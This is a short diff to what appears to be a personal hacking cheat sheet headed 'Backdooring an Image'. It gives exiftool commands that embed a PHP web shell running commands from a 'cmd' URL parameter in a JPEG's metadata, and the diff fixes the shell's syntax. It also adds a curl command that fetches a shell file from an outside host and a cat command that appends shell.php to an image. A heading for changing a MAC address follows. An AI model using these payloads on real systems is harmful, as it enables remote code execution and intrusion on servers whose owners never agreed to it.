@@ -1,6 +1,7 @@
 ####Backdooring an Image####
-exiftool -Comment="<?php passthru(\$_GET'cmd'); _halt_compiler(); ?>" /root/imagen.jpg
+exiftool -Comment="<?php passthru(\$_GET['cmd']); __halt_compiler(); ?>" /root/imagen.jpg
 exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" /root/imagen.jpg
+curl -o hidden.txt https://url.website.com/shell.txt
 cat file.jpg shell.php > compress.jpg
 
 *************Change Mac address(privileges root)*******************
